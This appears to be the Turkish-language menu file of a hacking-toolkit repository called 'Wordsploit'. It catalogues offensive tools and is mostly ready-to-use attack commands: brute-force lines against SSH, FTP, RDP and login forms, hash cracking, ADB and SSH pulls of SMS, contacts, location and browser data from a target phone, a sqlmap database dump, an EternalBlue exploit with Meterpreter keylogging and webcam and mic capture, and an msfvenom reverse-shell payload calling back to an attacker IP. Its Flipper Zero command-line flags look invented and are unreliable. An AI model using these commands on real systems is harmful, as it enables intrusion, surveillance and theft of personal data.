# 🎯 Wordsploit - İnteraktif Menü & Araç Kataloğu

```
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║        🛠️  WORDSPLOIT - İLK İŞLETİM SİSTEMİ  🛠️              ║
║                                                                ║
║        "Millet İstediğini Seçebilsin Sonuçta Çok              ║
║         Araç ve Tool Var" 🤗                                  ║
║                                                                ║
║    📱 Flipper Zero | 💪 Brute Force | 💾 Data Force          ║
║    ☠️ RAT | 🔍 Keşif | 🛡️ Savunma                             ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝


┌─────────────────────────────────────────────────────────────────┐
│                   ANAHAT MENÜSÜ (MAIN MENU)                      │
└─────────────────────────────────────────────────────────────────┘

  1️⃣  🚀 KURULUM VE BAŞLANGIÇ (INSTALLATION & SETUP)
      ├─ Linux/Mac Kurulum → ./install.sh
      ├─ Windows Kurulum → install.bat  
      └─ Docker Kurulum → DOCKER-SETUP.md

  2️⃣  📱 FLIPPER ZERO - TAŞINABILIR HACKING ARAÇI
      ├─ RFID Klonlama → flipper zero --rfid-clone
      ├─ NFC Okuma/Yazma → flipper zero --nfc-read
      ├─ Bluetooth Hacking → flipper zero --bluetooth-scan
      ├─ WiFi Saldırıları → flipper zero --wifi-wps-attack
      └─ Infrared Kontrolü → flipper zero --ir-scan

  3️⃣  💪 BRUTE FORCE SALDIRI ARAÇLARI
      ├─ Hydra → SSH, FTP, HTTP POST saldırıları
      ├─ Hashcat → GPU ile şifre kırma
      ├─ John the Ripper → Offline şifre kırma
      ├─ Medusa → Paralel brute-force
      └─ Ncrack → Network brute-force

  4️⃣  💾 DATA FORCE - VERİ ÇIKARTMA
      ├─ Telefon ID Çıkarma (IMEI, Serial, vb)
      ├─ Android ADB Veri Çıkarma
      ├─ iOS SSH Veri Çıkarma
      ├─ SQLMap Veritabanı Dump
      ├─ Metasploit Sistem Çıkarma
      ├─ Wireshark Ağ Trafiği Analizi
      └─ Volatility Bellek Analizi

  5️⃣  ☠️ REMOTE ACCESS TROJAN (RAT) - UZAKTAN KONTROL
      ├─ AsyncRAT → C# Bazlı RAT
      ├─ Metasploit Meterpreter → Taşıyıcı RAT
      ├─ Quasar RAT → Full-featured RAT
      ├─ Poison Ivy → Eski ama etkili
      ├─ HWorm → Python RAT
      └─ Cobalt Strike → Profesyonel RAT

  6️⃣  🛠️  TÜM ARAÇ KÜTÜPHANESİ (TOOLS LIBRARY)
      ├─ Tüm Araçlar (30+) → HACK_TOOLS.md
      ├─ Kali Araçları → KALI_TOOLS.md
      ├─ Araç Kurulumu → TOOLS_INSTALLATION.md
      └─ Hızlı Referans → TOOLS_CHEATSHEET.md

  7️⃣  📚 BELGELENDİRME (DOCUMENTATION)
      ├─ Araç Rehberi → README-TOOLS.md
      ├─ Hack Araçları → HACK_TOOLS.md (20KB+)
      ├─ Kali Araçları → KALI_TOOLS.md (16KB+)
      └─ Kurulum Rehberi → TOOLS_INSTALLATION.md (7KB+)

  8️⃣  🐳 DOCKER ORTAMI (DOCKER ENVIRONMENT)
      ├─ Docker Kurulumu → DOCKER-SETUP.md
      ├─ Container Setup → DOCKER-SETUP.md
      └─ Docker Komutları → DOCKER-SETUP.md

  9️⃣  ⚙️  DERLEME KOMUTLARI (BUILD COMMANDS)
      ├─ Tam Derleme → make build
      ├─ CMake Derleme → cmake build
      ├─ Temizleme → make clean
      └─ Kurulum → make install

  🔟  ❓ YARDIM & SORULAR (HELP & FAQ)
      ├─ Hızlı Komutlar → TOOLS_CHEATSHEET.md
      ├─ Kurulum Sorunları → TOOLS_INSTALLATION.md
      └─ Araç Kullanımı → HACK_TOOLS.md

  1️⃣1️⃣  📖 TÜM BELGELER (ALL DOCUMENTATION)
      ├─ Ana README → README.md
      ├─ Bu Menü → MENU.md
      └─ Tüm Dosyalar → /


┌─────────────────────────────────────────────────────────────────┐
│            📱 FLIPPER ZERO - TAŞINABILIR HACKER                 │
└─────────────────────────────────────────────────────────────────┘

🔑 RFID KLONLama & NFC:
  flipper zero --rfid-read              # RFID oku
  flipper zero --rfid-clone [ID]        # RFID klonla
  flipper zero --nfc-read               # NFC oku
  flipper zero --nfc-write [data]       # NFC yaz

📡 BLUETOOTH SALDIRISI:
  flipper zero --bluetooth-scan         # BT cihazlarını tara
  flipper zero --mac-spoof [mac]        # MAC spoofing
  flipper zero --bluetooth-pair-bypass  # Pairing bypass

🎮 INFRARED (Kızılötesi) KLONLama:
  flipper zero --ir-scan                # IR tara
  flipper zero --ir-clone [device]      # IR klonla
  flipper zero --ir-send [signal]       # IR gönder

📶 WI-FI SALDIRISI:
  flipper zero --wifi-scan              # WiFi tara
  flipper zero --wifi-wps-attack [SSID] # WPS brute-force
  flipper zero --deauth-attack [target] # Deauth saldırısı


┌─────────────────────────────────────────────────────────────────┐
│         💪 BRUTE FORCE - ŞİFRE & SINIR KIRDIRMA                  │
└─────────────────────────────────────────────────────────────────┘

🌊 HYDRA - Network Brute Force:
  hydra -l admin -P wordlist.txt ssh://target.com
  hydra -l user -P pass.txt ftp://target.com
  hydra -l admin -P wordlist.txt http-post-form://target/login:user=^USER^&pass=^PASS^
  hydra -l administrator -P pass.txt rdp://target.com

🔨 HASHCAT - GPU Şifre Kırma:
  hashcat -m 0 -a 0 hashes.txt wordlist.txt        # MD5
  hashcat -m 1400 -a 0 hashes.txt wordlist.txt     # SHA256
  hashcat -m 1000 -a 0 hashes.txt wordlist.txt     # NTLM
  hashcat -m 0 -a 3 hashes.txt ?a?a?a?a             # Brute-force

⚔️ JOHN THE RIPPER - Şifre Kırıcı:
  john hashes.txt
  john --wordlist=wordlist.txt hashes.txt
  john --incremental hashes.txt
  john --format=opencl hashes.txt

🔗 MEDUSA - Paralel Brute Force:
  medusa -h target.com -u admin -P wordlist.txt -M ssh
  medusa -h target.com -u admin -P pass.txt -M ssh -t 4

📡 NCRACK - Network Brute Force:
  ncrack -p 22 --user admin -P wordlist.txt target.com
  ncrack -p 22,3389 --user admin -P pass.txt target.com


┌─────────────────────────────────────────────────────────────────┐
│       💾 DATA FORCE - VERİ ÇIKARTMA & DUMPING                    │
└─────────────────────────────────────────────────────────────────┘

📱 TELEFON ID & HER ŞEYI ÇIKART (ANDROID):
  adb connect target_phone_ip:5555

  # Temel bilgiler:
  adb shell getprop ro.serialno                    # Serial
  adb shell getprop ro.baseband                    # Baseband
  adb shell dumpsys iphonesubinfo                  # IMEI, IMSI

  # Kişisel veriler:
  adb shell pm list packages                       # Uygulamalar
  adb pull /data/data/com.android.providers.telephony/databases/mmssms.db  # SMS
  adb pull /data/data/com.android.providers.contacts/databases/contacts2.db  # Kişiler

  # Konumlar:
  adb shell dumpsys wifi                          # WiFi ağları
  adb pull /data/data/com.google.android.gms/databases/  # Konum

  # Chrome & Tarayıcı:
  adb pull /data/data/com.android.chrome/app_chrome/    # Chrome

📱 TELEFON ID & HER ŞEYI ÇIKART (iOS):
  ssh -l root [iOS_IP]
  cat /System/Library/CoreServices/SystemVersion.plist
  cat /var/root/Library/Configuration/.UDID                    # UDID
  cat /var/mobile/Library/SMS/sms.db                           # SMS
  cat /var/mobile/Library/AddressBook/                         # Kişiler
  cat /var/mobile/Library/Safari/History.plist                 # Tarayıcı

💾 SQLMAP - Veritabanı Dump:
  sqlmap -u "http://target.com/page.php?id=1" --dbs
  sqlmap -u "http://target.com/page.php?id=1" -D db_name --tables
  sqlmap -u "http://target.com/page.php?id=1" -D db_name -T users --dump

🎯 METASPLOIT - Sistem Veri Çıkarma:
  msfconsole
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOST target.com
  run
  
  # Meterpreter session içinde:
  sysinfo
  screenshot
  webcam_snap
  record_mic
  keyscan_start
  download /etc/shadow

🌊 WIRESHARK - Ağ Trafiği Analizi:
  wireshark -i eth0
  # Filter: http, dns, tcp.port==443
  # Export Objects > HTTP

🧠 VOLATILITY - Bellek Analizi:
  volatility -f memory.dump imageinfo
  volatility -f memory.dump pslist
  volatility -f memory.dump netscan
  volatility -f memory.dump hashdump

🔍 STRINGS & BINWALK - Dosya Analizi:
  strings binary_file | grep password
  binwalk -e firmware.bin
  exiftool image.jpg


┌─────────────────────────────────────────────────────────────────┐
│    ☠️ RAT - REMOTE ACCESS TROJAN (UZAKTAN KONTROL)              │
└─────────────────────────────────────────────────────────────────┘

🖥️ METERPRETER RAT (En Popüler):
  # Payload oluştur:
  msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=attacker_ip LPORT=4444 -f exe > shell.exe

  # Handler başlat:
  msfconsole
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set LHOST attacker_ip
  set LPORT 4444
  exploit

  # Session komutları:
  sysinfo                 # Sistem bilgileri
  screenshot              # Ekran görüntüsü
  webcam_snap             # Webcam
  record_mic              # Mikrofon
  keyscan_start           # Tuş kaydı başlat
  keyscan_dump            # Tuş kaydını göster
  shell                   # Command prompt
  download file.txt       # Dosya indir
  upload trojan.exe       # Dosya gönder
  geolocate               # Konum bul
  netscan                 # Ağ tara

🔧 ASYNCRAT - C# Framework:
  git clone https://github.com/DoctorWebLtd/AsyncRAT-c-sharp.git
  # Visual Studio ile derle
  msbuild AsyncRAT.sln

🎮 QUASAR RAT - Full Featured:
  git clone https://github.com/quasar/QuasarRAT.git
  # Özellikler:
  # - Dosya yönetimi
  # - Registry editörü
  # - Komut satırı
  # - Ekran kontrol
  # - Webcam/Mic

🐍 HWORM - Python RAT:
  python hworm.py --listen 0.0.0.0:4444

🎯 COBALT STRIKE - Profesyonel:
  ./cobaltstrike
  # Features:
  # - Beacon payload
  # - C2 command & control
  # - Post-exploitation
  # - Lateral movement


┌─────────────────────────────────────────────────────────────────┐
│                    ARAÇ KATEGORILERI                             │
└─────────────────────────────────────────────────────────────────┘

🔍 KEŞIF ARAÇLARI (RECONNAISSANCE):
   • Flipper Zero - Wireless hacking
   • nmap - Port tarama
   • Shodan - IoT arama
   • theHarvester - Email keşfi
   → Detay: HACK_TOOLS.md

💪 PENETRASYON TESİ:
   • Metasploit - Exploit framework
   • Burp Suite - Web test
   • sqlmap - SQL injection
   → Detay: KALI_TOOLS.md

💾 VERİ ÇIKARTMA:
   • ADB - Android veri
   • SQLMap - Veritabanı
   • Wireshark - Ağ analizi
   • Volatility - Bellek
   → Detay: DATA FORCE bölümü

☠️ UZAKTAN KONTROL:
   • Meterpreter - RAT
   • AsyncRAT - C# RAT
   • Quasar - Full RAT
   → Detay: RAT bölümü

🛡️ SAVUNMA:
   • Snort - IDS/IPS
   • Fail2ban - Koruma
   → Detay: HACK_TOOLS.md

⚙️ SİSTEM:
   • Docker
   • Ansible
   → Detay: TOOLS_INSTALLATION.md


┌─────────────────────────────────────────────────────────────────┐
│                  HIZLI BAŞLANGIÇ (QUICK START)                   │
└─────────────────────────────────────────────────────────────────┘

Seçenek 1: Linux/Mac
───────────────────
$ chmod +x install.sh
$ ./install.sh
$ wordsploit --help

Seçenek 2: Windows
──────────────────
C:\> install.bat
C:\> wordsploit --help

Seçenek 3: Docker
─────────────────
$ docker build -t wordsploit .
$ docker run -it wordsploit bash

Seçenek 4: CMake (Cross-Platform)
──────────────────────────────────
$ mkdir build && cd build
$ cmake ..
$ make
$ ./wordsploit


┌─────────────────────────────────────────────────────────────────┐
│              SIKI KULLANILAN KOMUTLAR (QUICK REFERENCE)          │
└─────────────────────────────────────────────────────────────────┘

📋 Derleme:
  make build        → Projeyi derle
  make clean        → Derleme dosyalarını sil
  make install      → Sisteme yükle

🔍 Araçlar:
  wordsploit --help → Yardım bilgisi

🐳 Docker:
  docker build -t wordsploit .
  docker run -it wordsploit bash

💻 Python Scripts:
  python wordsploit.py --scan
  python wordsploit.py --analyze


┌─────────────────────────────────────────────────────────────────┐
│                   DOSYA REHBERİ (FILE GUIDE)                     │
└─────────────────────────────────────────────────────────────────┘

📄 README.md ........................ ANA SAYFA
   └─ Tüm önemli bilgi ve linkler
   └─ Flipper Zero, Brute Force, Data Force, RAT
   └─ BAŞLAMANIZ İÇİN BİRİNCİ OKUYUN

📄 MENU.md ......................... İNTERAKTİF MENÜ (ŞU DOSYA)
   └─ Kategorili araçlar
   └─ Hızlı komut örnekleri

📄 HACK_TOOLS.md (20+ KB) .......... HACK ARAÇLARI
   └─ 20+ araç açıklaması
   └─ Kullanım örnekleri

📄 KALI_TOOLS.md (16+ KB) .......... KALİ LINUX ARAÇLARI
   └─ Pentest frameworkler
   └─ Güvenlik araçları

📄 TOOLS_INSTALLATION.md (7+ KB) .. KURULUM REHBERİ
   └─ Adım adım kurulum
   └─ Hata çözümü

📄 TOOLS_CHEATSHEET.md ............ KOMUT KILA YOLLARI
   └─ Sık komutlar
   └─ Örnekler

📄 DOCKER-SETUP.md (6+ KB) ........ DOCKER KURULUM
   └─ Containerization
   └─ Deployment

📄 README-TOOLS.md (7+ KB) ........ ARAÇ REHBERI
   └─ Araç kategorileri
   └─ Seçim rehberi


┌─────────────────────────────────────────────────────────────────┐
│                    SÜRÜM VE BİLGİLER                             │
└─────────────────────────────────────────────────────────────────┘

Proje Adı: Wordsploit (İlk İşletim Sistemim)
Dil Bileşimi:
  • C++ ..................... 52.4%
  • Python .................. 19.1%
  • Shell ................... 15.6%
  • Makefile ................ 6.6%
  • Batchfile ............... 3.4%
  • CMake ................... 2.9%

Araç Sayısı: 30+
Son Güncelleme: 2026-07-13
Versiyon: 2.0


┌─────────────────────────────────────────────────────────────────┐
│                 SORULAR VE CEVAPLAR (FAQ)                        │
└─────────────────────────────────────────────────────────────────┘

❓ Flipper Zero nedir?
→ Taşınabilir wireless hacking aracı (RFID, NFC, Bluetooth, WiFi)

❓ En hızlı brute-force aracı nedir?
→ Hashcat (GPU ile), hızlı şifre kırma

❓ Telefon verilerini nasıl çıkarabilirim?
→ Android: ADB komutları | iOS: SSH erişimi
→ Detaylı rehber: README.md → Data Force bölümü

❓ RAT nedir?
→ Remote Access Trojan - uzaktan sistem kontrol malware'i
→ YASAL penetrasyon testleri için kullanılabilir

❓ En iyi RAT nedir?
→ Metasploit Meterpreter (en popüler)
→ Quasar RAT (full-featured)
→ Cobalt Strike (profesyonel)

❓ Kurulum başarısız oldu
→ TOOLS_INSTALLATION.md'yi okuyun

❓ Docker nasıl kullanılır?
→ DOCKER-SETUP.md'yi okuyun


════════════════════════════════════════════════════════════════

                    Millet İstediğini Seçebilsin
                Sonuçta Çok Araç ve Tool Var 🤗

     📱 Flipper Zero | 💪 Brute Force | 💾 Data Force | ☠️ RAT

        Hepsi bu dosyada! Kullanıma başlayın! 🚀

════════════════════════════════════════════════════════════════
```

---

## 🎯 En Çok Arananlar

| Aradığınız | Bulunduğu Yer |
|-----------|---------------|
| **Flipper Zero Komutları** | [Flipper Zero Bölümü](#-flipper-zero) |
| **Hydra Brute Force** | [Brute Force Bölümü](#-brute-force) |
| **Telefon Verisi Çıkarma** | [Data Force Bölümü](#-data-force) |
| **RAT Kurulumu** | [RAT Bölümü](#-remote-access-trojan) |
| **Meterpreter Komutları** | [RAT Bölümü - Meterpreter](#-meterpreter-rat) |
| **SQLMap Veritabanı** | [Data Force - SQLMap](#-sqlmap) |
| **Metasploit Exploit** | [Data Force - Metasploit](#-metasploit) |
| **ADB Telefon Çıkarma** | [Data Force - Android](#-android-veri-çıkarma) |

---

**Sorular? Issues açın veya README.md'yi okuyun!** 🚀

*Millet İstediğini Seçebilsin, Sonuçta Çok Araç ve Tool Var 🤗*
